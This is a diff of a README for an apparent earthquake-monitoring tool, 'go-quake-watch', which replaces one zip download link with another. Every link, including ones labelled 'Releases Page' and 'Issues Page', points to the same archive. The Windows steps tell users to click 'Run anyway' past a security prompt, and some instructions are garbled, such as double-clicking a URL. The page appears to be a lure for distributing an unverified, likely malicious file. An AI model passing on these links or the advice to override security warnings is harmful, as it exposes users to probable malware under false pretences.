@@ -6,7 +6,7 @@ Welcome to **go-quake-watch**! This tool allows you to monitor global seismic ac
 
 ## 📥 Download Now
 
-[![Download go-quake-watch](https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip)](https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip)
+[![Download go-quake-watch](https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip)](https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip)
 
 ## 🔧 System Requirements
 
@@ -25,30 +25,30 @@ Welcome to **go-quake-watch**! This tool allows you to monitor global seismic ac
 
 ## 💻 How to Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip).
+1. Visit the [Releases Page](https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the appropriate file for your operating system.
-   - Windows users: download `https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip`
-   - macOS users: download `https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip`
-   - Linux users: download `https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip`
+   - Windows users: download `https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip`
+   - macOS users: download `https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip`
+   - Linux users: download `https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip`
 4. After downloading, locate the file on your computer.
 5. Follow the instructions below to run the application:
 
 ### 🖥️ Windows
 
-- Double-click on `https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip`.
+- Double-click on `https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip`.
 - If you see a security prompt, click "More info" and then "Run anyway".
 - The application will start automatically.
 
 ### 🍏 macOS
 
-- Open the downloaded `https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip`.
+- Open the downloaded `https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip`.
 - Drag the icon to your Applications folder.
 - Open the Applications folder and double-click the icon to launch.
 
 ### 🐧 Linux
 
-- Extract the downloaded `https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip`.
+- Extract the downloaded `https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip`.
 - Open your terminal and navigate to the extracted folder.
 - Run the application with the command: `./go-quake-watch`.
 
@@ -63,7 +63,7 @@ After launching the application, you’ll see an overview of recent seismic acti
 
 ## 🔄 Updating the Application
 
-To ensure you always have the latest features and security updates, regularly check the [Releases Page](https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip) for new versions. Follow the same download and install steps to update your application.
+To ensure you always have the latest features and security updates, regularly check the [Releases Page](https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip) for new versions. Follow the same download and install steps to update your application.
 
 ## 🚧 Troubleshooting
 
@@ -80,7 +80,7 @@ To ensure you always have the latest features and security updates, regularly ch
 
 ## 📞 Support
 
-If you encounter issues or have questions, please create an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip). 
+If you encounter issues or have questions, please create an issue on our [GitHub Issues Page](https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip). 
 
 ## 📚 Topics
 
@@ -98,4 +98,4 @@ By understanding these topics, you can fully leverage the go-quake-watch applica
 
 Explore the interactive features and monitor the seismic activity in your region. Enjoy a simple yet effective way to stay informed about earthquakes around the world.
 
-For more details and updates, continue to check the [Releases Page](https://raw.githubusercontent.com/RStrader25/go-quake-watch/main/duopolistic/go_quake_watch_3.4.zip). Happy monitoring!
+For more details and updates, continue to check the [Releases Page](https://github.com/RStrader25/go-quake-watch/raw/refs/heads/main/duopolistic/quake-go-watch-v2.3.zip). Happy monitoring!
